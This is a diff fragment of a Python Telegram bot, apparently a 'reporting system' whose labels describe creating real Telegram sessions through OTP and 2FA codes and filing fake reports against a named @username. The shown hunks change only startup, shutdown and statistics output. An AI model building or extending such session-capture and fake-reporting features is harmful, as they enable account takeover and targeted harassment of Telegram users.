+        info_table = Table(title="System Information", box=box.ROUNDED)
+        info_table.add_column("Component", style="cyan")
+        info_table.add_column("Status", style="green")
+        info_table.add_column("Details", style="yellow")
+        
+        info_table.add_row("Bot Token", "✅ Configured", "Ready to connect")
+        info_table.add_row("API Credentials", "✅ Valid", f"API ID: {API_ID}")
+        info_table.add_row("Session Creator", "✅ Working", "Real OTP + 2FA support")
+        info_table.add_row("Reporting System", "✅ Simulated", "Fake analytics + forwarding")
+        info_table.add_row("Data Storage", "✅ Ready", f"Sessions: {SESSION_DIR}")
+        info_table.add_row("System Uptime", "⏰ Starting", datetime.now().strftime("%H:%M:%S"))
+        
+        console.print(info_table)
         
         try:
             await self.application.initialize()
             await self.application.start()
-            await self.application.updater.start_polling()
             
-            console.print("[green]✅ Bot is running![/green]")
-            console.print("[yellow]📱 Use /start in Telegram to begin[/yellow]")
+            # Get bot info
+            bot_info = await self.application.bot.get_me()
+            console.print(f"[green]✅ Bot is running as @{bot_info.username}[/green]")
+            console.print(f"[yellow]📱 Use /start in Telegram to begin[/yellow]")
+            
+            # Display quick start guide
+            console.print("\n[cyan]⚡ Quick Start Guide:[/cyan]")
+            console.print("1. Send /start to see available commands")
+            console.print("2. Use /addsession to create real Telegram session")
+            console.print("3. Verify OTP with /verifyotp 12345")
+            console.print("4. Create fake reports with /report @username")
+            console.print("5. Check stats with /stats")
             
             # Keep running
-            try:
-                while True:
-                    await asyncio.sleep(1)
-            except KeyboardInterrupt:
-                console.print("\n[yellow]⚠️ Shutting down...[/yellow]")
+            await self.application.updater.start_polling()
             
+            # Keep the application running
+            await asyncio.Event().wait()
+            
+        except KeyboardInterrupt:
+            console.print("\n[yellow]⚠️ Received shutdown signal...[/yellow]")
         except Exception as e:
             console.print(f"[red]❌ Bot error: {e}[/red]")
+            import traceback
+            traceback.print_exc()
         finally:
             await self.shutdown()
     
     async def shutdown(self):
         """Shutdown the bot"""
         try:
+            # Disconnect all Telegram clients
+            for phone, session_data in self.session_creator.active_sessions.items():
+                try:
+                    if session_data.get("client"):
+                        await session_data["client"].disconnect()
+                except:
+                    pass
+            
+            # Disconnect OTP clients
+            for session_id, otp_session in self.session_creator.otp_sessions.items():
+                try:
+                    if otp_session.client:
+                        await otp_session.client.disconnect()
+                except:
+                    pass
+            
+            # Shutdown bot
             if hasattr(self.application, 'updater'):
                 await self.application.updater.stop()
             await self.application.stop()
             await self.application.shutdown()
+            
             console.print("[green]✅ Bot shutdown complete[/green]")
+            
+            # Display final statistics
+            uptime = datetime.now() - self.stats["start_time"]
+            hours, remainder = divmod(int(uptime.total_seconds()), 3600)
+            minutes, seconds = divmod(remainder, 60)
+            
+            console.print(f"\n[cyan]📊 Final Statistics:[/cyan]")
+            console.print(f"• Uptime: {hours}h {minutes}m {seconds}s")
+            console.print(f"• Commands Processed: {self.stats['commands_processed']}")
+            console.print(f"• Messages Forwarded: {self.stats['messages_forwarded']}")
+            console.print(f"• Sessions Created: {self.stats['sessions_created']}")
+            console.print(f"• Fake Reports: {self.reporting_system.reports_made}")
+            
         except Exception as e:
             console.print(f"[red]❌ Shutdown error: {e}[/red]")
 
@@ -941,8 +999,10 @@ All reports and statistics are simulated.
 
 async def main():
     """Main function"""
+    console.print("[bright_cyan]=" * 60)
     console.print("[bright_cyan]⚡ TELEGRAM REPORTING SYSTEM v11.1[/bright_cyan]")
     console.print("[cyan]Fixed Session Creator + Fake Reporting System[/cyan]")
+    console.print("[bright_cyan]=" * 60)
     
     # Create and run bot
     bot = SimpleTelegramBot()
@@ -956,7 +1016,9 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        console.print("\n[yellow]👋 Application terminated[/yellow]")
+        console.print("\n[yellow]👋 Application terminated by user[/yellow]")
     except Exception as e:
         console.print(f"[red]❌ Critical error: {e}[/red]")
+        import traceback
+        traceback.print_exc()
         sys.exit(1)
